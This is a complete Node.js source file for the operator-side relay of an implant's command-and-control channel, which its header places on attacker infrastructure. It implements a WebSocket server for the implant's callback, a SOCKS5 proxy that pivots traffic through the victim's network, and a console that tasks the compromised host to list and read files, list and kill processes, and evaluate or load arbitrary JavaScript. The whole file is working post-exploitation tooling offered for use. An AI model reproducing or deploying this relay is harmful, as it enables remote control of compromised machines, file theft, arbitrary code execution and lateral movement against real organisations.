#!/usr/bin/env node
// ws_relay.js — operator-side relay for the implant's interactive WS channel.
//
// Sits on the attacker's infrastructure (VPS/lab box). The implant makes ONE
// outbound WebSocket connection here (push-style: no polling, data moves only
// when it exists) and everything multiplexes over that single TCP connection:
//
//   - SOCKS5 server (RFC1928, NO_AUTH, CONNECT): operator tools point at
//     --socks port and their TCP sessions are dialed from the implant's
//     network — pivoting without a single extra HTTP request.
//   - interactive console: pwd/cd/ls/cat/ps/kill — the same task framing the
//     C2 uses (LE task stream in, BE output stream out), pushed over WS, so
//     the console works even while the HTTP beacon sleeps.
//
// The WS server is hand-rolled RFC6455 (handshake + frames + masking) to keep
// the whole repo zero-dependency. Auth: shared 16-byte key (see wslink.js).
//
// Usage:
//   node scripts/ws_relay.js --port 8765 --socks 1080 --key <32hex>
// then the agent's sidecar/env:
//   ADAPTIX_WS_URL=ws://<relay>:8765/tunnel  ADAPTIX_WS_KEY=<same 32hex>
// console commands: help, status, socks <port>|stop, pwd, cd, ls, cat, ps, kill
const http = require('http');
const net = require('net');
const crypto = require('crypto');
const readline = require('readline');
const {
  seal, unseal, authBlob,
  T_TASK, T_TUN, T_PING, T_HELLO, T_WELCOME, HELLO_MAGIC,
} = require('../src/wslink');

const ts = () => new Date().toISOString().slice(11, 19);
const log = (m) => console.log(`[${ts()}] ${m}`);

// ============================================================ pure helpers ==
// (importable for tests — the runtime below is guarded by require.main)

const WS_GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11';
function wsAccept(key) { return crypto.createHash('sha1').update(key + WS_GUID).digest('base64'); }

function wsEncode(opcode, payload = Buffer.alloc(0)) {
  const len = payload.length;
  let head;
  if (len < 126) { head = Buffer.alloc(2); head[1] = len; }
  else if (len < 65536) { head = Buffer.alloc(4); head[1] = 126; head.writeUInt16BE(len, 2); }
  else { head = Buffer.alloc(10); head[1] = 127; head.writeBigUInt64BE(BigInt(len), 2); }
  head[0] = 0x80 | opcode;
  return Buffer.concat([head, payload]);
}

class WsReader {
  constructor(handlers) { this.buf = Buffer.alloc(0); this.h = handlers; this.frag = null; }
  feed(chunk) {
    this.buf = this.buf.length ? Buffer.concat([this.buf, chunk]) : chunk;
    for (;;) {
      if (this.buf.length < 2) return;
      const b0 = this.buf[0], b1 = this.buf[1];
      const fin = !!(b0 & 0x80), opcode = b0 & 0x0f;
      const masked = !!(b1 & 0x80);
      let len = b1 & 0x7f, off = 2;
      if (len === 126) { if (this.buf.length < 4) return; len = this.buf.readUInt16BE(2); off = 4; }
      else if (len === 127) { if (this.buf.length < 10) return; len = Number(this.buf.readBigUInt64BE(2)); off = 10; }
      if (len > 64 * 1024 * 1024) { this.h.violation(); return; }
      let mask = null;
      if (masked) { if (this.buf.length < off + 4) return; mask = this.buf.slice(off, off + 4); off += 4; }
      if (this.buf.length < off + len) return;
      let payload = this.buf.slice(off, off + len);
      this.buf = this.buf.slice(off + len);
      if (mask) { payload = Buffer.from(payload); for (let i = 0; i < payload.length; i++) payload[i] ^= mask[i & 3]; }
      if (opcode === 0) { // continuation
        if (this.frag) {
          this.frag.parts.push(payload);
          if (fin) { const m = Buffer.concat(this.frag.parts); const op = this.frag.op; this.frag = null; this.h.message(op, m); }
        }
        continue;
      }
      if (opcode === 8) { this.h.close(); continue; }
      if (opcode === 9) { this.h.ping(payload); continue; }
      if (opcode === 10) { this.h.pong(payload); continue; }
      if (fin) this.h.message(opcode, payload);
      else this.frag = { op: opcode, parts: [payload] };
    }
  }
}

// console task packing (LE, exactly like the server's PackArray):
//   [u32le total][u32le cmd][args: u32le | u32le len + bytes + NUL][u32le taskId]
function packTaskLE(cmdId, args, taskId) {
  const parts = [];
  let payloadLen = 4 + 4; // cmd + taskId
  for (const a of args || []) {
    if (a.t === 'str') {
      // server PackArray semantics: length INCLUDES the NUL (len+1); an empty
      // string stays length 0 with no NUL appended (pl_packer.go PackArray)
      const b = Buffer.from(String(a.v), 'utf8');
      const withNul = b.length ? Buffer.concat([b, Buffer.from([0])]) : b;
      const l = Buffer.alloc(4); l.writeUInt32LE(withNul.length, 0);
      const piece = Buffer.concat([l, withNul]);
      payloadLen += piece.length; parts.push(piece);
    } else if (a.t === 'bytes') {
      // PackArray []byte semantics: RAW bytes, no length prefix (a preceding
      // int arg carries the length — mirrors pl_packer.go)
      payloadLen += a.v.length; parts.push(a.v);
    } else {
      const b = Buffer.alloc(4); b.writeUInt32LE(a.v >>> 0, 0);
      payloadLen += 4; parts.push(b);
    }
  }
  const total = Buffer.alloc(4); total.writeUInt32LE(payloadLen, 0);
  const cmd = Buffer.alloc(4); cmd.writeUInt32LE(cmdId, 0);
  const tid = Buffer.alloc(4); tid.writeUInt32LE(taskId, 0);
  return Buffer.concat([total, cmd, ...parts, tid]);
}

// reply reader (BE, exactly like OutPacker): u32 total counts itself
class BEReader {
  constructor(buf) { this.buf = buf; this.pos = 4; this.end = buf.length; }
  u32() { const v = this.buf.readUInt32BE(this.pos); this.pos += 4; return v; }
  u16() { const v = this.buf.readUInt16BE(this.pos); this.pos += 2; return v; }
  u8() { return this.buf[this.pos++]; }
  u64() { const v = this.buf.readBigUInt64BE(this.pos); this.pos += 8; return v; }
  str() { const l = this.u32(); const s = this.buf.slice(this.pos, this.pos + l).toString('utf8'); this.pos += l; return s; }
  bytes() { const l = this.u32(); const b = this.buf.slice(this.pos, this.pos + l); this.pos += l; return b; }
  get more() { return this.pos < this.end; }
}

const CMD = { PWD: 4, CD: 8, LS: 14, RM: 17, MKDIR: 27, CAT: 24, PS_LIST: 41, PS_KILL: 42, ERROR: 0x1111ffff,
              JS_EVAL: 0x1337, JS_LOAD: 0x1338, JS_MODS: 0x1339, JS_CALL: 0x133a };

function decodeReply(buf) {
  if (buf.length < 12) return '(short reply)';
  const r = new BEReader(buf);
  const taskId = r.u32();
  const cmdId = r.u32();
  const lines = [`[task ${taskId.toString(16)}]`];
  try {
    if (cmdId === CMD.PWD || cmdId === CMD.CD) lines.push(`cwd: ${r.str()}`);
    else if (cmdId === CMD.LS) {
      const ok = r.u8();
      if (!ok) lines.push(`Error [${r.u32()}]`);
      else {
        const path = r.str(); const n = r.u32();
        lines.push(`Listing '${path}' (${n})`);
        for (let i = 0; i < n && r.more; i++) {
          const dir = r.u8(); const size = r.u64(); const mtime = r.u32(); const name = r.str();
          lines.push(`  ${dir ? 'd' : '-'} ${String(size).padStart(12)}  ${name}`);
        }
      }
    } else if (cmdId === CMD.CAT) {
      const path = r.str(); const content = r.bytes();
      lines.push(`--- ${path} (${content.length}B) ---\n${content.toString('utf8')}`);
    } else if (cmdId === CMD.PS_LIST) {
      const ok = r.u8();
      if (!ok) lines.push('Failed to get process list');
      else {
        const n = r.u32();
        lines.push('  PID     PPID    SESS  ARCH ELEV  USER                     NAME');
        for (let i = 0; i < n && r.more; i++) {
          const pid = r.u16(), ppid = r.u16(), sess = r.u16(), arch = r.u8(), elev = r.u8();
          const domain = r.str(), user = r.str(), name = r.str();
          lines.push(`  ${String(pid).padEnd(7)} ${String(ppid).padEnd(7)} ${String(sess).padEnd(5)} ${arch === 1 ? 'x64' : 'x86'}   ${elev ? '*' : ' '}     ${(`${domain}\\${user}`).padEnd(24)} ${name}`);
        }
      }
    } else if (cmdId === CMD.PS_KILL) lines.push(`Process ${r.u32()} killed`);
    else if (cmdId === CMD.JS_EVAL || cmdId === CMD.JS_LOAD || cmdId === CMD.JS_MODS || cmdId === CMD.JS_CALL) {
      const ok = r.u8();
      lines.push(`${ok ? '' : 'ERR '}${r.str()}`);
    }
    else if (cmdId === CMD.ERROR) lines.push(`Error [${r.u32()}]`);
    else lines.push(`(cmd ${cmdId}) ${buf.length - 12}B: ${buf.slice(12, Math.min(60, buf.length)).toString('hex')}`);
  } catch (e) { lines.push(`(decode error: ${e.message})`); }
  return lines.join('\n');
}

if (require.main !== module) {
  module.exports = { packTaskLE, decodeReply, BEReader, WsReader, wsEncode, CMD };
  return;
}

// ================================================================= runtime ==
function arg(name, dflt) {
  const i = process.argv.indexOf(name);
  return i > 0 ? process.argv[i + 1] : dflt;
}
// --exec "line" (repeatable): non-interactive driving (tests/CI) — commands run
// once an implant connects; the relay exits after a grace period
const EXEC_QUEUE = process.argv.filter((_, i, a) => a[i - 1] === '--exec');
const EXEC_GRACE_MS = parseInt(arg('--exec-grace', '4000'), 10);
const WS_PORT = parseInt(arg('--port', '8765'), 10);
let SOCKS_PORT = parseInt(arg('--socks', '0'), 10); // 0 = start later via console
const WS_HOST = arg('--host', '127.0.0.1');
const KEY = arg('--key', null);
const AUTHKEY = KEY ? Buffer.from(KEY, 'hex') : null;
if (!AUTHKEY || AUTHKEY.length !== 16) {
  console.error('usage: ws_relay.js --key <32 hex chars> [--port 8765] [--socks 1080] [--host 127.0.0.1]');
  process.exit(1);
}

// ---- link + tunnel mux -------------------------------------------------------
let link = null;                // { sock, agentId, alive, helloTimer }
let lastRx = Date.now();
const tunnels = new Map();      // connId -> SOCKS5 client socket
const pendingOpens = new Map(); // connId -> { sock } awaiting OPEN_OK/FAIL
let nextConnId = 1;
const allocConnId = () => { let id; do { id = nextConnId++ & 0xffff; } while (id === 0); return id; };

function sendRaw(buf) { if (link && link.alive) { try { link.sock.write(buf); return true; } catch (_) {} } return false; }
function sendEnv(type, payload) {
  const p = payload || Buffer.alloc(0);
  const msg = Buffer.alloc(1 + p.length);
  msg[0] = type; p.copy(msg, 1);
  return sendRaw(wsEncode(2, msg));
}
const sendTask = (plain) => sendEnv(T_TASK, seal(AUTHKEY, plain));
function sendTunnel(connId, code, data) {
  const body = Buffer.alloc(3 + (data ? data.length : 0));
  body.writeUInt16BE(connId & 0xffff, 0); body[2] = code; if (data) data.copy(body, 3);
  return sendEnv(T_TUN, body);
}

function dropLink(why) {
  if (!link) return;
  log(`[-] link drop: ${why}`);
  link.alive = false;
  if (link.helloTimer) { clearTimeout(link.helloTimer); link.helloTimer = null; }
  try { link.sock.destroy(); } catch (_) {}
  for (const [id, sock] of tunnels) { try { sock.destroy(); } catch (_) {} tunnels.delete(id); }
  for (const [id, p] of pendingOpens) { try { p.sock.destroy(); } catch (_) {} pendingOpens.delete(id); }
  link = null;
}

// ---- SOCKS5 (RFC1928, NO_AUTH, CONNECT) --------------------------------------
const SOCKS_ERR = { ECONNREFUSED: 5, ENOTFOUND: 4, EACCES: 5, ETIMEDOUT: 3, EHOSTUNREACH: 4, ENETUNREACH: 3 };
function socksReply(sock, rep) {
  const r = Buffer.alloc(10);
  r[0] = 5; r[1] = rep; r[3] = 1; // ATYP ipv4, zero-bound addr/port
  try { sock.write(r); } catch (_) {}
}

function socksClient(sock) {
  // Buffered RFC1928 front-end. Message boundaries are NOT chunk boundaries:
  // clients like proxychains4 write greeting + CONNECT back-to-back (they can
  // coalesce into one TCP segment) and long requests can split across reads.
  // We therefore parse from a byte buffer and only consume complete messages.
  let stage = 'greeting';
  let connId = 0;
  let buf = Buffer.alloc(0);
  sock.on('error', () => {});
  sock.on('data', (chunk) => {
    if (stage === 'open') { // established: everything is payload
      if (buf.length) { sendTunnel(connId, 1, buf); buf = Buffer.alloc(0); }
      sendTunnel(connId, 1, chunk);
      return;
    }
    buf = Buffer.concat([buf, chunk]);

    while (stage === 'greeting') {
      if (buf.length < 2) return; // need nmethods byte
      if (buf[0] !== 5) { sock.destroy(); return; } // not SOCKS5
      const n = buf[1];
      if (buf.length < 2 + n) return; // need the full method list
      const methods = buf.slice(2, 2 + n);
      buf = buf.slice(2 + n);
      if (!methods.includes(0)) { // no NO_AUTH offered
        try { sock.write(Buffer.from([5, 0xff])); } catch (_) {}
        sock.destroy(); return;
      }
      try { sock.write(Buffer.from([5, 0])); } catch (_) {} // NO AUTH
      stage = 'request';
    }

    if (stage === 'request') {
      if (buf.length < 4) return;
      if (buf[0] !== 5) { sock.destroy(); return; }
      if (buf[1] !== 1) { socksReply(sock, 7); sock.destroy(); return; } // CMD != CONNECT
      const atyp = buf[3];
      let need; // total request length
      if (atyp === 1) need = 4 + 4 + 2;                    // IPv4
      else if (atyp === 3) { if (buf.length < 5) return; need = 4 + 1 + buf[4] + 2; } // DOMAIN
      else if (atyp === 4) need = 4 + 16 + 2;              // IPv6
      else { socksReply(sock, 8); sock.destroy(); return; } // bad ATYP
      if (buf.length < need) return; // split read: wait for the rest

      let host, port;
      if (atyp === 1) { host = [...buf.slice(4, 8)].join('.'); port = buf.readUInt16BE(8); }
      else if (atyp === 3) { const n = buf[4]; host = buf.slice(5, 5 + n).toString('utf8'); port = buf.readUInt16BE(5 + n); }
      else {
        const parts = [...buf.slice(4, 20)];
        host = parts.reduce((acc, b, i) => acc + b.toString(16).padStart(2, '0') + (i % 2 && i < 15 ? ':' : ''), '') || '::1';
        port = buf.readUInt16BE(20);
      }
      buf = buf.slice(need);

      if (!link || !link.alive) { socksReply(sock, 1); sock.destroy(); return; }
      connId = allocConnId();
      tunnels.set(connId, sock);
      pendingOpens.set(connId, { sock });
      stage = 'open';
      log(`[socks] CONNECT ${host}:${port} -> conn ${connId}`);
      sendTunnel(connId, 0, Buffer.from(`${host}:${port}`)); // OPEN_REQ
      // early payload in the same segment (pipelined writers) still flows:
      if (buf.length) { sendTunnel(connId, 1, buf); buf = Buffer.alloc(0); }
    }
  });
  sock.on('close', () => { if (connId && tunnels.has(connId)) { tunnels.delete(connId); sendTunnel(connId, 2); } });
}

function startSocks(port) {
  const srv = net.createServer(socksClient);
  srv.listen(port, WS_HOST, () => log(`[socks] SOCKS5 listening on ${WS_HOST}:${port} (NO_AUTH, CONNECT)`));
  srv.on('error', (e) => log(`[-] socks listen failed: ${e.message}`));
  return srv;
}

// ---- console REPL -------------------------------------------------------------
let taskId = 0x57530000; // 'WS'
let socksSrv = null;
const rl = readline.createInterface({ input: process.stdin, output: process.stdout, prompt: 'relay> ' });

function dispatchLine(line) {
  {
  const parts = line.trim().split(/\s+/);
  const cmd = (parts[0] || '').toLowerCase();
  if (!cmd) { rl.prompt(); return; }
  const need = () => { if (!link || !link.alive) { log('no implant link — nothing connected'); rl.prompt(); return false; } return true; };
  switch (cmd) {
    case 'help':
      console.log('status | socks <port>|stop | pwd | cd <path> | ls [path] | cat <file> | ps | kill <pid>');
      rl.prompt(); break;
    case 'status':
      console.log(`link: ${link && link.alive ? `UP (agent ${link.agentId.toString(16)})` : 'down'}   tunnels: ${tunnels.size}   socks: ${socksSrv ? 'on' : 'off'}`);
      rl.prompt(); break;
    case 'socks':
      if (parts[1] === 'stop') { if (socksSrv) { socksSrv.close(); socksSrv = null; log('socks stopped'); } }
      else { const p = parseInt(parts[1], 10); if (p) { SOCKS_PORT = p; socksSrv = startSocks(p); } else log('usage: socks <port>|stop'); }
      rl.prompt(); break;
    case 'pwd': if (need()) sendTask(packTaskLE(CMD.PWD, [], ++taskId)); break;
    case 'cd': if (need() && parts[1]) sendTask(packTaskLE(CMD.CD, [{ t: 'str', v: parts[1] }], ++taskId)); break;
    case 'ls': if (need()) sendTask(packTaskLE(CMD.LS, [{ t: 'str', v: parts[1] || '.' }], ++taskId)); break;
    case 'cat': if (need() && parts[1]) sendTask(packTaskLE(CMD.CAT, [{ t: 'str', v: parts[1] }], ++taskId)); break;
    case 'ps': if (need()) sendTask(packTaskLE(CMD.PS_LIST, [], ++taskId)); break;
    case 'kill': if (need() && parts[1]) sendTask(packTaskLE(CMD.PS_KILL, [{ t: 'u32', v: parseInt(parts[1], 10) }], ++taskId)); break;
    case 'js': {
      if (!need()) break;
      const code = line.trim().replace(/^js\s+/, ''); // raw rest-of-line (code contains spaces)
      if (code) sendTask(packTaskLE(CMD.JS_EVAL, [{ t: 'str', v: code }], ++taskId));
      else { log('usage: js <js-expression-or-block>'); rl.prompt(); }
      break;
    }
    case 'load': {
      if (!need()) break;
      if (parts[1] && parts[2]) {
        try {
          const code = require('fs').readFileSync(parts[2]);
          sendTask(packTaskLE(CMD.JS_LOAD, [{ t: 'str', v: parts[1] }, { t: 'u32', v: code.length }, { t: 'bytes', v: code }], ++taskId));
        } catch (e) { log(`load: ${e.message}`); rl.prompt(); }
      } else { log('usage: load <name> <local-file.js>'); rl.prompt(); }
      break;
    }
    case 'modules': if (need()) sendTask(packTaskLE(CMD.JS_MODS, [], ++taskId)); break;
    case 'call': {
      if (!need()) break;
      if (parts[1] && parts[2]) {
        const rest = line.trim().match(/^\S+\s+\S+\s+\S+\s+([\s\S]*)$/);
        sendTask(packTaskLE(CMD.JS_CALL, [{ t: 'str', v: parts[1] }, { t: 'str', v: parts[2] }, { t: 'str', v: rest ? rest[1].trim() : '' }], ++taskId));
      } else { log('usage: call <name> <fn> [json-args-array]'); rl.prompt(); }
      break;
    }
    default: log(`unknown: ${cmd}`); rl.prompt(); return;
  }
  }
}
rl.on('line', dispatchLine);
rl.on('close', () => { /* stdin EOF (scripted runs): keep the relay up */ });

// ---- link delivery -------------------------------------------------------------
function onTaskStream(buf) {
  let dec;
  try { dec = unseal(AUTHKEY, buf); } catch (e) { log(`[-] task decrypt failed: ${e.message}`); return; }
  let off = 0;
  while (off + 12 <= dec.length) {
    const total = dec.readUInt32BE(off);
    if (total < 12 || off + total > dec.length) { log('[-] bad reply framing'); break; }
    log(decodeReply(dec.slice(off, off + total)));
    off += total;
  }
}

function onTunnelFrame(body) {
  const connId = body.readUInt16BE(0);
  const code = body[2];
  const data = body.slice(3);
  const peer = tunnels.get(connId);
  if (code === 3) { // OPEN_OK
    const p = pendingOpens.get(connId);
    if (p) { pendingOpens.delete(connId); socksReply(p.sock, 0); }
    return;
  }
  if (code === 4) { // OPEN_FAIL
    const p = pendingOpens.get(connId);
    if (p) {
      pendingOpens.delete(connId); tunnels.delete(connId);
      socksReply(p.sock, SOCKS_ERR[data.toString()] || 1);
      try { p.sock.destroy(); } catch (_) {}
    }
    log(`[-] conn ${connId} failed: ${data.toString()}`);
    return;
  }
  if (code === 1) { if (peer) { try { peer.write(data); } catch (_) {} } return; }
  if (code === 2) { if (peer) { tunnels.delete(connId); try { peer.end(); } catch (_) {} } return; }
}

// ---- the WS server ---------------------------------------------------------------
const server = http.createServer((req, res) => { res.writeHead(404, { 'Content-Type': 'text/plain' }); res.end('not found'); });
server.on('upgrade', (req, sock, head) => {
  const key = req.headers['sec-websocket-key'];
  if (!key || (req.headers.upgrade || '').toLowerCase() !== 'websocket') { sock.destroy(); return; }
  sock.write(
    'HTTP/1.1 101 Switching Protocols\r\n' +
    'Upgrade: websocket\r\n' +
    'Connection: Upgrade\r\n' +
    `Sec-WebSocket-Accept: ${wsAccept(key)}\r\n` +
    '\r\n');
  if (link) dropLink('replaced by new connection');
  link = { sock, agentId: 0, alive: true, helloTimer: setTimeout(() => dropLink('hello timeout'), 6000) };
  lastRx = Date.now();
  const reader = new WsReader({
    message: (op, msg) => {
      lastRx = Date.now();
      if (op !== 2) return; // binary only
      const type = msg[0];
      const body = msg.slice(1);
      if (process.env.WS_DEBUG) log(`[dbg] frame type=0x${type.toString(16)} ${body.length}B`);
      if (type === T_HELLO) {
        if (link && link.helloTimer) { clearTimeout(link.helloTimer); link.helloTimer = null; }
        const magic = body.readUInt32BE(0);
        const agentId = body.readUInt32LE(4);
        const auth = body.slice(9);
        const expect = authBlob(AUTHKEY, agentId);
        if (magic !== HELLO_MAGIC || auth.length !== expect.length || !crypto.timingSafeEqual(auth, expect)) {
          log('[-] auth FAILED — dropping');
          try { sock.destroy(); } catch (_) {}
          if (link) { link.alive = false; link = null; }
          return;
        }
        if (link) link.agentId = agentId;
        sendEnv(T_WELCOME);
        log(`[+] implant ${agentId.toString(16)} connected — interactive channel UP`);
        if (EXEC_QUEUE.length) {
          for (const l of EXEC_QUEUE) setTimeout(() => dispatchLine(l), 250);
          setTimeout(() => { log('[=] exec queue drained — exiting'); process.exit(0); }, EXEC_GRACE_MS);
        }
        rl.prompt(true);
        return;
      }
      if (!link || !link.alive) return;
      if (type === T_TASK) onTaskStream(body);
      else if (type === T_TUN) onTunnelFrame(body);
      // T_PING: already refreshed lastRx
    },
    ping: (p) => sendRaw(wsEncode(10, p)),
    pong: () => {},
    close: () => dropLink('socket close'),
    violation: () => dropLink('frame too large'),
  });
  reader.feed(head);
  sock.on('data', (c) => { lastRx = Date.now(); reader.feed(c); });
  sock.on('error', () => dropLink('socket error'));
  sock.on('close', () => dropLink('socket close'));
});

// half-open detection: nothing at all for 30s -> drop (client pings every 10s)
setInterval(() => { if (link && Date.now() - lastRx > 30000) dropLink('keepalive timeout'); }, 5000);
setInterval(() => sendEnv(T_PING), 10000);

server.listen(WS_PORT, WS_HOST, () => {
  log(`[+] WS relay on ws://${WS_HOST}:${WS_PORT} (path-agnostic)`);
  if (SOCKS_PORT) socksSrv = startSocks(SOCKS_PORT);
  log('[+] waiting for implant hello… (console: help)');
  rl.prompt(true);
});

process.on('SIGINT', () => { log('bye'); process.exit(0); });
